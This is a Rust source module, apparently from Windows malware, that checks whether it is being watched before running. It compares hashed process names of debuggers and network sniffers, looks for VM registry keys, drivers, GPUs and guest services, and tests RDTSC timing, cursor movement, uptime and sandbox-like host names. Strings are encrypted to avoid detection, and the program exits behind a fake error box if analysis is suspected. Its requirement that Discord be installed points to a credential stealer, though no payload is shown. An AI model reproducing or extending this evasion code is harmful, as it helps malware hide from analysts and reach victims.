use std::path::PathBuf;
use std::process;
use crate::encrypted::*;
use crate::core::api;

fn fail_and_exit() {
    api::message_box(&s_error_title(), &s_error_text(), api::MB_OK | api::MB_ICONERROR);
    process::exit(1);
}

// ── Stealth: process name FNV1a-32 hashes (no plaintext stored) ──────────────
// Known analysis/sandbox tools hashed at compile time.
const fn fnv1a32(s: &[u8]) -> u32 {
    let mut h: u32 = 2166136261;
    let mut i = 0;
    while i < s.len() {
        h ^= s[i] as u32;
        h = h.wrapping_mul(16777619);
        i += 1;
    }
    h
}

// Lowercase exe name hashes for common analysis tools
const H_WIRESHARK:      u32 = fnv1a32(b"wireshark.exe");
const H_PROCMON:        u32 = fnv1a32(b"procmon.exe");
const H_PROCMON64:      u32 = fnv1a32(b"procmon64.exe");
const H_X64DBG:         u32 = fnv1a32(b"x64dbg.exe");
const H_X32DBG:         u32 = fnv1a32(b"x32dbg.exe");
const H_OLLYDBG:        u32 = fnv1a32(b"ollydbg.exe");
const H_IDAQ:           u32 = fnv1a32(b"idaq.exe");
const H_IDAQ64:         u32 = fnv1a32(b"idaq64.exe");
const H_WINDBG:         u32 = fnv1a32(b"windbg.exe");
const H_FIDDLER:        u32 = fnv1a32(b"fiddler.exe");
const H_PROCESSHACKER:  u32 = fnv1a32(b"processhacker.exe");
const H_PESTUDIO:       u32 = fnv1a32(b"pestudio.exe");
const H_DUMPCAP:        u32 = fnv1a32(b"dumpcap.exe");
const H_TCPVIEW:        u32 = fnv1a32(b"tcpview.exe");
const H_AUTORUNS:       u32 = fnv1a32(b"autoruns.exe");
const H_AUTORUNSC:      u32 = fnv1a32(b"autorunsc.exe");
const H_FILEMON:        u32 = fnv1a32(b"filemon.exe");
const H_REGMON:         u32 = fnv1a32(b"regmon.exe");
const H_APIMONITOR:     u32 = fnv1a32(b"apimonitor-x64.exe");
const H_APIMONITOR32:   u32 = fnv1a32(b"apimonitor-x86.exe");
const H_DNSPY:          u32 = fnv1a32(b"dnspy.exe");
const H_HTTPDEBUGGER:   u32 = fnv1a32(b"httpdebugger.exe");
const H_CHARLES:        u32 = fnv1a32(b"charles.exe");
const H_FAKENET:        u32 = fnv1a32(b"fakenet.exe");
const H_IEXPRESS:       u32 = fnv1a32(b"iexpress.exe");
const H_LORDPE:         u32 = fnv1a32(b"lordpe.exe");
const H_PEID:           u32 = fnv1a32(b"peid.exe");
const H_REGSHOT:        u32 = fnv1a32(b"regshot.exe");
const H_SCYLLA:         u32 = fnv1a32(b"scylla.exe");
const H_SCYLLA64:       u32 = fnv1a32(b"scylla_x64.exe");
const H_HOOKEXPLORER:   u32 = fnv1a32(b"hookexplorer.exe");
const H_IMPORTREC:      u32 = fnv1a32(b"importrec.exe");
const H_PETOOLS:        u32 = fnv1a32(b"petools.exe");
const H_SYSANALYZER:    u32 = fnv1a32(b"sysanalyzer.exe");
const H_SNIFF_HIT:      u32 = fnv1a32(b"sniff_hit.exe");
const H_JOEBOXSERVER:   u32 = fnv1a32(b"joeboxserver.exe");
const H_JOEBOXCONTROL:  u32 = fnv1a32(b"joeboxcontrol.exe");
const H_RESOURCEHACKER: u32 = fnv1a32(b"resourcehacker.exe");
const H_RESHACKER:      u32 = fnv1a32(b"reshacker.exe");
const H_SANDBOX_TOTAL:  u32 = fnv1a32(b"total_cmd.exe");
const H_CUCKOO_AGENT:   u32 = fnv1a32(b"agent.py");
const H_CUCKOO_ANALYZER: u32 = fnv1a32(b"analyzer.py");
const H_VMWARETRAY:     u32 = fnv1a32(b"vmwaretray.exe");
const H_VMWAREUSER:     u32 = fnv1a32(b"vmwareuser.exe");
const H_VBOXSERVICE:    u32 = fnv1a32(b"vboxservice.exe");
const H_VBOXTRAY:       u32 = fnv1a32(b"vboxtray.exe");
const H_VMSRVC:         u32 = fnv1a32(b"vmsrvc.exe");
const H_VMUSRVC:        u32 = fnv1a32(b"vmusrvc.exe");
const H_XENSERVICE:     u32 = fnv1a32(b"xenservice.exe");
const H_QEMUAGENT:      u32 = fnv1a32(b"qemu-ga.exe");

const ANALYSIS_HASHES: &[u32] = &[
    H_WIRESHARK, H_PROCMON, H_PROCMON64, H_X64DBG, H_X32DBG, H_OLLYDBG,
    H_IDAQ, H_IDAQ64, H_WINDBG, H_FIDDLER, H_PROCESSHACKER, H_PESTUDIO,
    H_DUMPCAP, H_TCPVIEW, H_AUTORUNS, H_AUTORUNSC, H_FILEMON, H_REGMON,
    H_APIMONITOR, H_APIMONITOR32, H_DNSPY, H_HTTPDEBUGGER, H_CHARLES,
    H_FAKENET, H_IEXPRESS, H_LORDPE, H_PEID, H_REGSHOT, H_SCYLLA,
    H_SCYLLA64, H_HOOKEXPLORER, H_IMPORTREC, H_PETOOLS, H_SYSANALYZER,
    H_SNIFF_HIT, H_JOEBOXSERVER, H_JOEBOXCONTROL, H_RESOURCEHACKER,
    H_RESHACKER,
];

const VM_PROCESS_HASHES: &[u32] = &[
    H_VMWARETRAY, H_VMWAREUSER, H_VBOXSERVICE, H_VBOXTRAY,
    H_VMSRVC, H_VMUSRVC, H_XENSERVICE, H_QEMUAGENT,
];

// ── Check: Discord installed (at least one Discord variant) ──────────────────

fn is_any_discord_installed() -> bool {
    let local_appdata = match std::env::var(s_localappdata()) {
        Ok(path) => PathBuf::from(path),
        Err(_) => return false,
    };

    let candidates = [
        local_appdata.join(s_sandbox_discord()),
        local_appdata.join(s_sandbox_discord_ptb()),
        local_appdata.join(s_sandbox_discord_canary()),
        local_appdata.join(s_programs_discord()),
        PathBuf::from(s_pf_discord()),
        PathBuf::from(s_pf86_discord()),
    ];

    for path in candidates {
        if path.exists() && path.is_dir() {
            return true;
        }
    }
    false
}

// ── Check: uptime > 5 minutes ────────────────────────────────────────────────

fn check_uptime() -> bool {
    api::check_uptime()
}

// ── Check: screen resolution is reasonable ───────────────────────────────────

fn check_resolution() -> bool {
    api::check_resolution()
}

// ── Check: CPU count > 2 ─────────────────────────────────────────────────────

fn check_cpu_count() -> bool {
    api::check_cpu_count()
}

// ── Check: physical RAM > 4 GB ───────────────────────────────────────────────

fn check_ram() -> bool {
    api::check_ram()
}

// ── Check: no known analysis/sandbox process running ─────────────────────────
// Uses FNV1a hash comparison — no plaintext process names in binary.

fn check_no_analysis_processes() -> bool {
    !api::enum_processes(|name| {
        let h = fnv1a32(name.as_bytes());
        ANALYSIS_HASHES.contains(&h)
    })
}

// ── Check: no VM guest service processes running ─────────────────────────────

fn check_no_vm_processes() -> bool {
    !api::enum_processes(|name| {
        let h = fnv1a32(name.as_bytes());
        VM_PROCESS_HASHES.contains(&h)
    })
}

// ── Check: display adapter is not a known VM virtual GPU ─────────────────────
// Uses string comparison on decrypted strings — no plaintext in binary.

fn check_display_adapter() -> bool {
    let vm_adapters: &[&str] = &[
        &s_det_disp_vbox(),
        &s_det_disp_vmware(),
        &s_det_disp_hyper_v(),
        &s_det_disp_parallels(),
    ];
    !api::display_device_contains(vm_adapters)
}

// ── Check: VM registry keys absent ───────────────────────────────────────────
// Checks a selection of well-known VM registry artifacts via RegOpenKeyExW.
// Stealthy: keys are AES-encrypted; no registry path appears as plaintext.

fn check_no_vm_registry() -> bool {
    let hklm = api::HKEY_LOCAL_MACHINE;
    let hkcu = api::HKEY_CURRENT_USER;

    let vm_keys: &[(*mut u8, fn() -> String)] = &[
        (hklm, s_det_reg_vbox_key as fn() -> String),
        (hklm, s_det_reg_vmware_key),
        (hklm, s_det_reg_vbox_additions),
        (hklm, s_det_reg_vbox_acpi),
        (hklm, s_det_reg_hyperv_key),
    ];

    for (hive, key_fn) in vm_keys {
        if api::reg_key_exists(*hive, &key_fn()) {
            return false;
        }
    }
    true
}

// ── Check: additional VM driver files ────────────────────────────────────────

fn check_no_extra_vm_drivers() -> bool {
    let sys = std::env::var(s_det_windir()).unwrap_or_else(|_| s_det_windir_default());
    let drivers = std::path::PathBuf::from(&sys).join(s_det_system32_drivers());
    let checks = [
        s_det_vmmouse_sys(),
        s_det_vmrawdsk_sys(),
        s_det_vmusbmouse_sys(),
        s_det_vmkbd_sys(),
        s_det_vmMemctl_sys(),
        s_det_vboxwddm_sys(),
    ];
    for name in &checks {
        if drivers.join(name).exists() {
            return false;
        }
    }
    true
}

// ── Check: disk size is plausible (> 60 GB) ──────────────────────────────────
// Sandboxes often run on tiny disk images.

fn check_disk_size() -> bool {
    let size = api::get_system_disk_size();
    // 0 means we couldn't query (pass it through), otherwise require > 60 GB
    size == 0 || size > 60_000_000_000
}

// ── Check: RDTSC timing anomaly ──────────────────────────────────────────────
// Hypervisors often add overhead to RDTSC. A single sample is unreliable,
// so we take multiple samples and look for a consistently high delta.
// Threshold chosen conservatively to avoid false positives on slow hardware.

fn check_rdtsc_timing() -> bool {
    let mut anomalies = 0u32;
    for _ in 0..8 {
        // A threshold of 1000 cycles for a tiny nop sequence is extremely
        // generous for native hardware but can be exceeded under heavy VM
        // RDTSC emulation. We count "slow" samples.
        let delta = api::rdtsc_timing_check();
        if delta > 2000 {
            anomalies += 1;
        }
    }
    // Require at least 5 out of 8 samples to be "slow" before flagging
    anomalies < 6
}

// ── Check: cursor has moved at some point ────────────────────────────────────
// Automated sandbox environments typically have a static cursor.
// We sample the position, wait briefly, then check again.
// This is a soft heuristic; we only fail if combined with other signals.

fn check_cursor_movement() -> Option<bool> {
    let p1 = api::get_cursor_pos()?;
    std::thread::sleep(std::time::Duration::from_millis(150));
    let p2 = api::get_cursor_pos()?;
    Some(p1.x != p2.x || p1.y != p2.y)
}

// ── Check: foreground window exists ─────────────────────────────────────────
// In most sandboxes the desktop never has a foreground window.

fn check_foreground_window() -> bool {
    api::has_foreground_window()
}

// ── Check: computer/user name is not obviously a sandbox name ────────────────

fn check_host_user_names() -> bool {
    let suspicious_hosts = [
        s_det_host_sandbox(), s_det_host_malware(), s_det_host_virus(),
        s_det_host_cuckoo(), s_det_host_analy(), s_det_host_win7(),
        s_det_host_win10(),
    ];
    let suspicious_users = [
        s_det_user_admin(), s_det_user_user(), s_det_user_test(),
        s_det_sandbox(), s_det_virus(), s_det_malware(),
    ];

    if let Ok(host) = std::env::var(s_det_computername()) {
        let lower = host.to_lowercase();
        if suspicious_hosts.iter().any(|s| lower == *s) {
            return false;
        }
        // Generic hostnames like "desktop-xxxxxxx" (exactly 15 chars) are fine,
        // but "sandbox", "cuckoo" etc. are not.
    }

    if let Ok(user) = std::env::var(s_det_username()) {
        let lower = user.to_lowercase();
        if suspicious_users.iter().any(|s| lower == *s) {
            return false;
        }
    }

    true
}

// ── Composite score-based verdict ────────────────────────────────────────────
// Rather than hard-failing on a single check, we accumulate a suspicion score.
// This makes it much harder for automated sandboxes to bypass one check and
// still pass. The thresholds are tuned to be robust on real machines.

pub fn verify_environment() {
    let mut score: i32 = 0;

    // Hard requirements (very reliable, low false-positive risk)
    if !is_any_discord_installed() { score += 40; }
    if !check_uptime()             { score += 30; }
    if !check_ram()                { score += 25; }
    if !check_cpu_count()          { score += 20; }
    if !check_resolution()         { score += 15; }

    // Medium-reliability checks
    if !check_no_vm_processes()    { score += 35; }
    if !check_no_analysis_processes() { score += 30; }
    if !check_no_vm_registry()     { score += 30; }
    if !check_no_extra_vm_drivers(){ score += 25; }
    if !check_display_adapter()    { score += 25; }
    if !check_disk_size()          { score += 20; }
    if !check_host_user_names()    { score += 20; }
    if !check_foreground_window()  { score += 10; }

    // Soft heuristics (can have false positives, so weighted low)
    if !check_rdtsc_timing()       { score += 15; }
    if let Some(moved) = check_cursor_movement() {
        if !moved                  { score += 10; }
    }

    // Any score >= 40 is enough to exit.
    // A real machine will score 0. A sandbox typically scores 40-200+.
    if score >= 40 {
        fail_and_exit();
    }
}
